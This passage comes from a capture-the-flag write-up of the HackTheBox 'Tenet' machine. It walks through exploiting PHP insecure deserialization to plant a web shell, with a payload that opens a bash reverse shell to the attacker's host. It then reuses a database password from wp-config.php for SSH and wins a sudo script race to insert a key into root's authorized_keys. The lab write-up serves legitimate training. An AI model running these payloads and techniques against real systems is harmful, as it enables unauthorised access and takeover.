<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
$ wpscan --url http://tenet.htb/ -e vp,vt,cb,dbe,u1-15                                                          
_______________________________________________________________
         __          _______   _____
         <span class="se">\ \ </span>       / /  __ <span class="se">\ </span>/ ____<span class="p">|</span>
          <span class="se">\ \ </span> /<span class="se">\ </span> / /<span class="p">|</span> <span class="p">|</span>__<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>___   ___  __ _ _ __ ®
           <span class="se">\ \/</span>  <span class="se">\/</span> / <span class="p">|</span>  ___/ <span class="se">\_</span>__ <span class="se">\ </span>/ __<span class="p">|</span>/ _<span class="sb">`</span> <span class="p">|</span> <span class="err">&#39;</span>_ <span class="se">\
</span><span class="se"></span>            <span class="se">\ </span> /<span class="se">\ </span> /  <span class="p">|</span> <span class="p">|</span>     ____<span class="o">)</span> <span class="p">|</span> <span class="o">(</span>__<span class="p">|</span> <span class="o">(</span>_<span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span> <span class="p">|</span>
             <span class="se">\/</span>  <span class="se">\/</span>   <span class="p">|</span>_<span class="p">|</span>    <span class="p">|</span>_____/ <span class="se">\_</span>__<span class="p">|</span><span class="se">\_</span>_,_<span class="p">|</span>_<span class="p">|</span> <span class="p">|</span>_<span class="p">|</span>

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.17
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________
...&lt;SNIP&gt;...
<span class="o">[</span>i<span class="o">]</span> User<span class="o">(</span>s<span class="o">)</span> Identified:

<span class="o">[</span>+<span class="o">]</span> protagonist
 <span class="p">|</span> Found By: Author Posts - Author Pattern <span class="o">(</span>Passive Detection<span class="o">)</span>
 <span class="p">|</span> Confirmed By:
 <span class="p">|</span>  Rss Generator <span class="o">(</span>Passive Detection<span class="o">)</span>
 <span class="p">|</span>  Wp Json Api <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 <span class="p">|</span>   - http://tenet.htb/index.php/wp-json/wp/v2/users/?per_page<span class="o">=</span>100<span class="p">&amp;</span><span class="nv">page</span><span class="o">=</span><span class="m">1</span>
 <span class="p">|</span>  Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 <span class="p">|</span>  Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>

<span class="o">[</span>+<span class="o">]</span> neil
 <span class="p">|</span> Found By: Author Id Brute Forcing - Author Pattern <span class="o">(</span>Aggressive Detection<span class="o">)</span>
 <span class="p">|</span> Confirmed By: Login Error Messages <span class="o">(</span>Aggressive Detection<span class="o">)</span>
</code></pre></div><h4 id="directory-brute-force-guessing">Directory brute-force (Guessing)</h4>
<p>I tried to guess the location of sator php files with <code>curl</code> but nothing there.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
$ <span class="k">for</span> i in sator.php sator.php.bak<span class="p">;</span> <span class="k">do</span> curl -sIL http://tenet.htb/<span class="nv">$i</span><span class="p">;</span> <span class="k">done</span>
HTTP/1.1 <span class="m">404</span> Not Found
Date: Mon, <span class="m">14</span> Jun <span class="m">2021</span> 10:51:50 GMT
Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>iso-8859-1

HTTP/1.1 <span class="m">404</span> Not Found
Date: Mon, <span class="m">14</span> Jun <span class="m">2021</span> 10:51:51 GMT
Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>iso-8859-1
</code></pre></div><h3 id="vhost-enumeration">VHost enumeration</h3>
<p>Next, I&rsquo;ll try to enumerate vhost, but first I&rsquo;ll use <code>cewl</code> to generate a custom wordlist. Because &ldquo;sator&rdquo; and &ldquo;backup&rdquo; are consists of 5 characters, I&rsquo;ll set the minimum word length to 5.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
$ cewl -m <span class="m">5</span> -w wordlist-vhost http://tenet.htb
CeWL 5.4.6 <span class="o">(</span>Exclusion<span class="o">)</span> Robin Wood <span class="o">(</span>robin@digi.ninja<span class="o">)</span> <span class="o">(</span>https://digi.ninja/<span class="o">)</span>
</code></pre></div><p>I tried the wordlist with <code>ffuf</code>, but didn&rsquo;t find any (damn this tool is insanely fast, took 5 sec).</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
$ ffuf -w wordlist-vhost -u http://10.10.10.223 -H <span class="s2">&#34;Host: FUZZ.tenet.htb&#34;</span> -mc <span class="m">200</span> -fl <span class="m">376</span>

        /<span class="s1">&#39;___\  /&#39;</span>___<span class="se">\ </span>          /<span class="err">&#39;</span>___<span class="se">\ </span>      
       /<span class="se">\ \_</span>_/ /<span class="se">\ \_</span>_/  __  __  /<span class="se">\ \_</span>_/       
       <span class="se">\ \ </span>,__<span class="se">\\</span> <span class="se">\ </span>,__<span class="se">\/\ \/\ \ \ \ </span>,__<span class="se">\ </span>     
        <span class="se">\ \ \_</span>/ <span class="se">\ \ \_</span>/<span class="se">\ \ \_\ \ \ \ \_</span>/      
         <span class="se">\ \_\ </span>  <span class="se">\ \_\ </span> <span class="se">\ \_</span>___/  <span class="se">\ \_\ </span>      
          <span class="se">\/</span>_/    <span class="se">\/</span>_/   <span class="se">\/</span>___/    <span class="se">\/</span>_/       

       v1.3.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.223
 :: Wordlist         : FUZZ: wordlist-vhost
 :: Header           : Host: FUZZ.tenet.htb
 :: Follow redirects : <span class="nb">false</span>
 :: Calibration      : <span class="nb">false</span>
 :: Timeout          : <span class="m">10</span>
 :: Threads          : <span class="m">40</span>
 :: Matcher          : Response status: <span class="m">200</span>
 :: Filter           : Response lines: <span class="m">376</span>
________________________________________________

:: Progress: <span class="o">[</span>93/93<span class="o">]</span> :: Job <span class="o">[</span>1/1<span class="o">]</span> :: <span class="m">11</span> req/sec :: Duration: <span class="o">[</span>0:00:05<span class="o">]</span> :: Errors: <span class="m">0</span> ::
</code></pre></div><h3 id="apache-default-page-revisit">Apache Default Page (Revisit)</h3>
<p>The files that user Neil talking about was found at  <code>http://10.10.10.223/[here]</code> .</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
$ <span class="k">for</span> i in sator.php sator.php.bak<span class="p">;</span> <span class="k">do</span> curl -sIL http://10.10.10.223/<span class="nv">$i</span><span class="p">;</span> <span class="k">done</span>
HTTP/1.1 <span class="m">200</span> OK
Date: Mon, <span class="m">14</span> Jun <span class="m">2021</span> 11:21:04 GMT
Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8

HTTP/1.1 <span class="m">200</span> OK
Date: Mon, <span class="m">14</span> Jun <span class="m">2021</span> 11:21:05 GMT
Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
Last-Modified: Thu, <span class="m">17</span> Dec <span class="m">2020</span> 09:52:50 GMT
ETag: <span class="s2">&#34;202-5b6a5f47911e4&#34;</span>
Accept-Ranges: bytes
Content-Length: <span class="m">514</span>
Content-Type: application/x-trash
</code></pre></div><p>Another guessing, here the keyword is &ldquo;Migration&rdquo;, so I think that before they moving into <code>/wordpress/</code>, the site was previously hosted at  <code>/</code> (the root).</p>
<p>Poking <code>Sator.php</code> results the following contents:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
$ curl -s http://10.10.10.223/sator.php
<span class="o">[</span>+<span class="o">]</span> Grabbing users from text file &lt;br&gt;
<span class="o">[]</span> Database updated &lt;br&gt;
</code></pre></div><p>Poking <code>sator.php.bak</code> returns PHP codes.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
$ curl -s http://10.10.10.223/sator.php.bak
&lt;?php

class DatabaseExport
<span class="o">{</span>
        public <span class="nv">$user_file</span> <span class="o">=</span> <span class="s1">&#39;users.txt&#39;</span><span class="p">;</span>
        public <span class="nv">$data</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>

        public <span class="k">function</span> update_db<span class="o">()</span>
        <span class="o">{</span>
                <span class="nb">echo</span> <span class="s1">&#39;[+] Grabbing users from text file &lt;br&gt;&#39;</span><span class="p">;</span>
                <span class="nv">$this</span>-&gt; <span class="nv">data</span> <span class="o">=</span> <span class="s1">&#39;Success&#39;</span><span class="p">;</span>
        <span class="o">}</span>


        public <span class="k">function</span> __destruct<span class="o">()</span>
        <span class="o">{</span>
                file_put_contents<span class="o">(</span>__DIR__ . <span class="s1">&#39;/&#39;</span> . <span class="nv">$this</span> -&gt;user_file, <span class="nv">$this</span>-&gt;data<span class="o">)</span><span class="p">;</span>
                <span class="nb">echo</span> <span class="s1">&#39;[] Database updated &lt;br&gt;&#39;</span><span class="p">;</span>
        //      <span class="nb">echo</span> <span class="s1">&#39;Gotta get this working properly...&#39;</span><span class="p">;</span>
        <span class="o">}</span>
<span class="o">}</span>

<span class="nv">$input</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="o">[</span><span class="s1">&#39;arepo&#39;</span><span class="o">]</span> ?? <span class="s1">&#39;&#39;</span><span class="p">;</span>
<span class="nv">$databaseupdate</span> <span class="o">=</span> unserialize<span class="o">(</span><span class="nv">$input</span><span class="o">)</span><span class="p">;</span>

<span class="nv">$app</span> <span class="o">=</span> new DatabaseExport<span class="p">;</span>
<span class="nv">$app</span> -&gt; update_db<span class="o">()</span><span class="p">;</span>


?&gt;
</code></pre></div><h3 id="source-code-analysis">Source Code Analysis</h3>
<h4 id="deserialization-vulnerability">Deserialization vulnerability</h4>
<p>From the previous code, <code>sator.php.bak</code> contains a PHP magic function called <code>__destruct()</code>. I&rsquo;m not skilled enough to explain it on detail, but from what I know is that the function will be called when there is no more references to an object (comment by me):</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nv">$app</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DatabaseExport</span><span class="p">;</span>
<span class="nv">$app</span> <span class="o">-&gt;</span> <span class="na">update_db</span><span class="p">();</span> 
<span class="c1">// __destruct is called afterwards
</span><span class="c1">// [] Database updated will be printed out
</span></code></pre></div><p>Here is an example:</p>
<p><div class="img-container"><img src="imgs/image-20210614190334075.png" alt="image-20210614190334075"  /></div>
</p>
<p>Furthermore, the user-controlled input with parameter <code>arepo</code> is directly passed to <code>unserialize()</code> function. Knowing this, I could send a malicious DatabaseExport object (serialized) by assuming that <code>sator.php</code> uses the same code as <code>sator.php.bak</code>.</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-www-data">Shell as www-data</h3>
<h4 id="insecure-deserialization-attack---poc">Insecure Deserialization attack - PoC</h4>
<p>From the previous code, <code>unserialize</code> is called before the creation of object (<code>$app</code>), so I will use the opposite magic function called <code>__construct()</code>.</p>
<p>I&rsquo;ll do some testing with this script below.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">DatabaseExport</span>
<span class="p">{</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
        <span class="p">{</span>
        		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">user_file</span> <span class="o">=</span> <span class="s1">&#39;test.php&#39;</span><span class="p">;</span>
                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php phpinfo(); ?&gt;&#34;</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DatabaseExport</span><span class="p">();</span>
<span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">));</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>I use URL encode there because I&rsquo;m going to use <code>curl</code> to interact with the site. I will save the script to a file called <code>tenetization.php</code>.</p>
<p>I will run that script and copy the output. If I don&rsquo;t have PHP, I could use <a href="https://www.w3schools.com/php/phptryit.asp?filename=tryphp_compiler">this site</a> to get output of my PHP script.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
$ php tenetization.php
O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A8%3A%22test.php%22%3Bs%3A4%3A%22data%22%3Bs%3A19%3A%22%3C%3Fphp+phpinfo%28%29%3B+%3F%3E%22%3B%7D
</code></pre></div><p>I&rsquo;ll send that output to <code>sator.php</code> via <code>curl</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
$ curl -sI <span class="s2">&#34;http://10.10.10.223/sator.php?arepo=O%3A14%3A%22DatabaseExport%22%3A2%3A%7Bs%3A9%3A%22user_file%22%3Bs%3A8%3A%22test.php%22%3Bs%3A4%3A%22data%22%3Bs%3A19%3A%22%3C%3Fphp+phpinfo%28%29%3B+%3F%3E%22%3B%7D&#34;</span>
HTTP/1.1 <span class="m">200</span> OK
Date: Mon, <span class="m">14</span> Jun <span class="m">2021</span> 12:43:43 GMT
Server: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
</code></pre></div><p>When I visit <code>10.10.10.223/test.php</code>, it returns the PHP info page, which means I have a code execution.</p>
<p><div class="img-container"><img src="imgs/image-20210614194451145.png" alt="image-20210614194451145"  /></div>
</p>
<p>Based on 0xdf&rsquo;s awesome <a href="https://0xdf.gitlab.io/2021/06/12/htb-tenet.html#create-serialized-object">writeup</a>,  this payload would also works:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">DatabaseExport</span>
<span class="p">{</span>
		<span class="k">public</span> <span class="nx">user_file</span> <span class="o">=</span> <span class="s1">&#39;test.php&#39;</span><span class="p">;</span>
		<span class="k">public</span> <span class="nx">data</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php phpinfo(); ?&gt;&#34;</span><span class="p">;</span>
<span class="p">}</span>
<span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DatabaseExport</span><span class="p">();</span>
<span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">));</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><h4 id="insecure-deserialization-attack---weaponize">Insecure Deserialization attack - Weaponize</h4>
<p>This time, I&rsquo;ll modify the file name and the data for reverse shell.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
<span class="k">class</span> <span class="nc">DatabaseExport</span>
<span class="p">{</span>
        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
        <span class="p">{</span>
        		<span class="nv">$this</span><span class="o">-&gt;</span><span class="na">user_file</span> <span class="o">=</span> <span class="s1">&#39;iamf.php&#39;</span><span class="p">;</span>
                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">data</span> <span class="o">=</span> <span class="s2">&#34;&lt;?php system(</span><span class="se">\&#34;</span><span class="s2">/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.31/443 0&gt;&amp;1&#39; </span><span class="se">\&#34;</span><span class="s2">) ?&gt;&#34;</span><span class="p">;</span>
        <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DatabaseExport</span><span class="p">();</span>
<span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$o</span><span class="p">));</span>
<span class="cp">?&gt;</span><span class="err">
</span></code></pre></div><p>I&rsquo;ll script the exploitation step and then wait on my listener</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
</span><span class="cp"></span>
<span class="nv">serial</span><span class="o">=</span><span class="sb">`</span>php tenetization.php<span class="sb">`</span>
curl -s http://10.10.10.223/sator.php?arepo<span class="o">=</span><span class="nv">$serial</span>
sleep 5<span class="p">;</span>
curl -s http://10.10.10.223/iamf.php
</code></pre></div><p>When I run the exploit, it hangs.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
$ bash tenetization.sh
<span class="o">[</span>+<span class="o">]</span> Grabbing users from text file &lt;br&gt;
<span class="o">[]</span> Database updated &lt;br&gt;<span class="o">[]</span> Database updated &lt;br&gt;
</code></pre></div><p>But after a few seconds, I have a shell on my listener</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «~» «10.10.14.31»
$ nc -nvlp <span class="m">443</span>
listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> ...
connect to <span class="o">[</span>10.10.14.31<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.223<span class="o">]</span> <span class="m">39174</span>
bash: cannot <span class="nb">set</span> terminal process group <span class="o">(</span>1545<span class="o">)</span>: Inappropriate ioctl <span class="k">for</span> device
bash: no job control in this shell
www-data@tenet:/var/www/html$ id
id
<span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
www-data@tenet:/var/www/html$
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210614195508219.png" alt="image-20210614195508219"  /></div>
</p>
<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-neil">Shell as neil</h3>
<h4 id="wp-config">WP config</h4>
<p>Inside the <code>wp-config.php</code> file, there is a database credential.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">www-data@tenet:/var/www/html/wordpress$ cat wp-config.php
cat wp-config.php
&lt;?php

...&lt;SNIP&gt;...
define<span class="o">(</span> <span class="s1">&#39;DB_NAME&#39;</span>, <span class="s1">&#39;wordpress&#39;</span> <span class="o">)</span><span class="p">;</span>

/** MySQL database username */
define<span class="o">(</span> <span class="s1">&#39;DB_USER&#39;</span>, <span class="s1">&#39;neil&#39;</span> <span class="o">)</span><span class="p">;</span>

/** MySQL database password */
define<span class="o">(</span> <span class="s1">&#39;DB_PASSWORD&#39;</span>, <span class="s1">&#39;Opera2112&#39;</span> <span class="o">)</span><span class="p">;</span>
...&lt;SNIP&gt;...
</code></pre></div><h4 id="ssh---neil">SSH - Neil</h4>
<p>The credentials works on SSH (<code>neil:Opera2112</code>)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31»
$ ssh neil@10.10.10.223
neil@10.10.10.223<span class="err">&#39;</span>s password:
Welcome to Ubuntu 18.04.5 LTS <span class="o">(</span>GNU/Linux 4.15.0-129-generic x86_64<span class="o">)</span>

...&lt;SNIP&gt;...

Last login: Mon Jun <span class="m">14</span> 12:57:27 <span class="m">2021</span> from 10.10.16.12
neil@tenet:~$ id
<span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>neil<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>neil<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1001<span class="o">(</span>neil<span class="o">)</span>
</code></pre></div><p>User&rsquo;s flag is done here.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">neil@tenet:~$ ls -l
total <span class="m">4</span>
-r-------- <span class="m">1</span> neil neil <span class="m">33</span> Jun <span class="m">14</span> 06:46 user.txt
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210614200613572.png" alt="image-20210614200613572"  /></div>
</p>
<hr>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="sudo-privileges">Sudo privileges</h4>
<p>User neil has sudo privileges on a custom script called <code>enableSSH.sh</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">neil@tenet:~$ sudo -l
Matching Defaults entries <span class="k">for</span> neil on tenet:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>

User neil may run the following commands on tenet:
    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /usr/local/bin/enableSSH.sh
neil@tenet:~$ ls -l /usr/local/bin/enableSSH.sh
-rwxr-xr-x <span class="m">1</span> root root <span class="m">1080</span> Dec  <span class="m">8</span>  <span class="m">2020</span> /usr/local/bin/enableSSH.sh
</code></pre></div><h4 id="script-analysis">Script analysis</h4>
<p>The following is the contents of <code>enableSSH.sh</code></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
</span><span class="cp"></span>
checkAdded<span class="o">()</span> <span class="o">{</span>

        <span class="nv">sshName</span><span class="o">=</span><span class="k">$(</span>/bin/echo <span class="nv">$key</span> <span class="p">|</span> /usr/bin/cut -d <span class="s2">&#34; &#34;</span> -f 3<span class="k">)</span>

        <span class="k">if</span> <span class="o">[[</span> ! -z <span class="k">$(</span>/bin/grep <span class="nv">$sshName</span> /root/.ssh/authorized_keys<span class="k">)</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>

                /bin/echo <span class="s2">&#34;Successfully added </span><span class="nv">$sshName</span><span class="s2"> to authorized_keys file!&#34;</span>

        <span class="k">else</span>

                /bin/echo <span class="s2">&#34;Error in adding </span><span class="nv">$sshName</span><span class="s2"> to authorized_keys file!&#34;</span>

        <span class="k">fi</span>

<span class="o">}</span>

checkFile<span class="o">()</span> <span class="o">{</span>

        <span class="k">if</span> <span class="o">[[</span> ! -s <span class="nv">$1</span> <span class="o">]]</span> <span class="o">||</span> <span class="o">[[</span> ! -f <span class="nv">$1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>

                /bin/echo <span class="s2">&#34;Error in creating key file!&#34;</span>

                <span class="k">if</span> <span class="o">[[</span> -f <span class="nv">$1</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span> /bin/rm <span class="nv">$1</span><span class="p">;</span> <span class="k">fi</span>

                <span class="nb">exit</span> <span class="m">1</span>

        <span class="k">fi</span>

<span class="o">}</span>

addKey<span class="o">()</span> <span class="o">{</span>

        <span class="nv">tmpName</span><span class="o">=</span><span class="k">$(</span>mktemp -u /tmp/ssh-XXXXXXXX<span class="k">)</span>

        <span class="o">(</span><span class="nb">umask</span> 110<span class="p">;</span> touch <span class="nv">$tmpName</span><span class="o">)</span>

        /bin/echo <span class="nv">$key</span> &gt;&gt;<span class="nv">$tmpName</span>

        checkFile <span class="nv">$tmpName</span>

        /bin/cat <span class="nv">$tmpName</span> &gt;&gt;/root/.ssh/authorized_keys

        /bin/rm <span class="nv">$tmpName</span>

<span class="o">}</span>

<span class="nv">key</span><span class="o">=</span><span class="s2">&#34;ssh-rsa AAAAA3NzaG1yc2GAAAAGAQAAAAAAAQG+AMU8OGdqbaPP/Ls7bXOa9jNlNzNOgXiQh6ih2WOhVgGjqr2449ZtsGvSruYibxN+MQLG59VkuLNU4NNiadGry0wT7zpALGg2Gl3A0bQnN13YkL3AA8TlU/ypAuocPVZWOVmNjGlftZG9AP656hL+c9RfqvNLVcvvQvhNNbAvzaGR2XOVOVfxt+AmVLGTlSqgRXi6/NyqdzG5Nkn9L/GZGa9hcwM8+4nT43N6N31lNhx4NeGabNx33b25lqermjA+RGWMvGN8siaGskvgaSbuzaMGV9N8umLp6lNo5fqSpiGN8MQSNsXa3xXG+kplLn2W+pbzbgwTNN/w0p+Urjbl root@ubuntu&#34;</span>
addKey
checkAdded
</code></pre></div><p>The contents of the <code>$key</code> variable will be saved to a temporary file at <code>/tmp/SSH-randomfilename</code> before being added to the <code>/root/.ssh/authorized_keys file</code> by the <code>addKey()</code> function.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">neil@tenet:~$ <span class="nv">tmpName</span><span class="o">=</span><span class="k">$(</span>mktemp -u /tmp/ssh-XXXXXXXX<span class="k">)</span>
neil@tenet:~$ <span class="nb">echo</span> <span class="nv">$tmpName</span>
/tmp/ssh-4swbpcnN
</code></pre></div><p>Then the  <code>checkAdded()</code> function will take the  <code>username@hostname</code> part from the value of <code>$key</code> which is <code>root@ubuntu</code> and check if it already exist in <code>/root/.ssh/authorized_keys</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">...&lt;SNIP&gt;...
 <span class="k">if</span> <span class="o">[[</span> ! -z <span class="k">$(</span>/bin/grep <span class="nv">$sshName</span> /root/.ssh/authorized_keys<span class="k">)</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
                /bin/echo <span class="s2">&#34;Successfully added </span><span class="nv">$sshName</span><span class="s2"> to authorized_keys file!&#34;</span>
        <span class="k">else</span>
                /bin/echo <span class="s2">&#34;Error in adding </span><span class="nv">$sshName</span><span class="s2"> to authorized_keys file!&#34;</span>
        <span class="k">fi</span>
...&lt;SNIP&gt;...
</code></pre></div><p>The idea here is if I could overwrite the file contents of <code>/tmp/ssh-randomfilename</code> with my own public key then I should be able to log in as root using my private key. So, it&rsquo;s a race condition.</p>
<h4 id="exploiting-enablesshsh">Exploiting enableSSH.sh</h4>
<p>Just like how I did earlier on <a href="https://fahmifj.github.io/writeups/hackthebox/htb-scriptkiddie/#exploiting-scanloserssh">ScriptKiddie</a>, I&rsquo;ll also use while loop to keep inserting my public key at <code>/tmp/ssh-*</code>, but this time, I&rsquo;ll use a binary called <code>tee</code>.</p>
<p>First, I&rsquo;ll put my public key at Neil&rsquo;s home directory.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">neil@tenet:~$ <span class="nb">echo</span> <span class="s1">&#39;ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA... root@iamf&#39;</span> &gt; .iamf
</code></pre></div><p>And Then I&rsquo;ll run this loop to keep user <code>neil</code> executing sudo.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">neil@tenet:~$ <span class="k">while</span> sleep 1<span class="p">;</span> <span class="k">do</span> sudo /usr/local/bin/enableSSH.sh<span class="p">;</span> <span class="k">done</span><span class="p">;</span>
</code></pre></div><p>I&rsquo;ll open another neil&rsquo;s session and run this.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">neil@tenet:~$ <span class="k">while</span> sleep 0.1<span class="p">;</span> <span class="k">do</span> cat .iamf <span class="p">|</span> tee /tmp/ssh-*<span class="p">;</span><span class="k">done</span>
</code></pre></div><p>On my Kali, I will do SSH login in loop.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31»
$ <span class="k">while</span> sleep 1<span class="p">;</span> <span class="k">do</span> ssh -oConnectTimeout<span class="o">=</span>1s -oPasswordAuthentication<span class="o">=</span>no root@10.10.10.223 2&gt;/dev/null<span class="p">;</span> <span class="k">done</span>
</code></pre></div><p>After some minutes, I can finally login as root.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell">→ root@kali «tenet» «10.10.14.31» 
$ ssh root@10.10.10.223
Welcome to Ubuntu 18.04.5 LTS <span class="o">(</span>GNU/Linux 4.15.0-129-generic x86_64<span class="o">)</span>

...&lt;SNIP&gt;...

Last login: Tue Jun <span class="m">15</span> 09:50:37 <span class="m">2021</span> from 10.10.14.53
root@tenet:~# id
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
</code></pre></div><p><div class="img-container"><img src="imgs/image-20210615165352952.png" alt="image-20210615165352952"  /></div>
</p>
<p>Root flag is done here.</p>
<h2 id="references">References</h2>
<ul>
<li><a href="https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection">https://owasp.org/www-community/vulnerabilities/PHP_Object_Injection</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>HackTheBox - Cereal (User only)</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-cereal/</link>
      <pubDate>Wed, 09 Jun 2021 07:33:40 +0700</pubDate>
      
